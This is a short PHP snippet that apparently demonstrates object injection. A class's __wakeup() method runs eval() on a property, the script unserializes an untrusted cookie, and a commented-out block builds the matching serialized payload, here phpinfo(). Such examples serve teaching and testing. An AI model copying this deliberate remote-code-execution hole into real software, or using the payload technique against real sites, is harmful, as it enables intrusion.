<?php
//*
class Example {
	private $hook;
	
	function __wakeup() {
		if (isset($this->hook)) {
			eval($this->hook);
		}
	}
}
//*/

/*
class Example {
	private $hook = 'phpinfo();';
}
echo urlencode(serialize(new Example));
//*/

//
$userData = unserialize($_COOKIE['data']);
?>